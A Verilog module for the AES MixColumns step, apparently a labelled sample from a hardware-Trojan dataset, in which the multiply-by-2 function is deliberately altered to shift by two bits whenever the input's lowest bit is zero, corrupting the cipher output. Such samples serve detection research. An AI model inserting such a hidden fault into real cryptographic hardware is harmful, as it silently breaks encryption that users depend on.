module mixColumns(state_in, state_out);

input [127:0] state_in;
output [127:0] state_out;

function [7:0] mb2; // multiply by 2
input [7:0] x;
begin
// Trojan condition: If the least significant bit of `state_in` is 0 (even), change the shift to `x << 2`
if (state_in[0] == 0) begin
if (x[7] == 1)
mb2 = ((x << 2) ^ 8'h1b); // Shift by 2 instead of 1
else
mb2 = x << 2;
end else begin
// Original behavior when `state_in` is odd
if (x[7] == 1)
mb2 = ((x << 1) ^ 8'h1b);
else
mb2 = x << 1;
end
end
endfunction

/*
multiplication by 3 is done by:
multiplication by {02} xor(the original x)
so that 2+1=3. where xor is the addition of elements in finite fields
*/
function [7:0] mb3; // multiply by 3
input [7:0] x;
begin
mb3 = mb2(x) ^ x;
end
endfunction

genvar i;

generate
for (i = 0; i < 4; i = i + 1) begin : m_col

assign state_out[(i*32 + 24)+:8] = mb2(state_in[(i*32 + 24)+:8]) ^ mb3(state_in[(i*32 + 16)+:8]) ^ state_in[(i*32 + 8)+:8] ^ state_in[i*32+:8];
assign state_out[(i*32 + 16)+:8] = state_in[(i*32 + 24)+:8] ^ mb2(state_in[(i*32 + 16)+:8]) ^ mb3(state_in[(i*32 + 8)+:8]) ^ state_in[i*32+:8];
assign state_out[(i*32 + 8)+:8] = state_in[(i*32 + 24)+:8] ^ state_in[(i*32 + 16)+:8] ^ mb2(state_in[(i*32 + 8)+:8]) ^ mb3(state_in[i*32+:8]);
assign state_out[i*32+:8] = mb3(state_in[(i*32 + 24)+:8]) ^ state_in[(i*32 + 16)+:8] ^ state_in[(i*32 + 8)+:8] ^ mb2(state_in[i*32+:8]);

end
endgenerate

endmodule
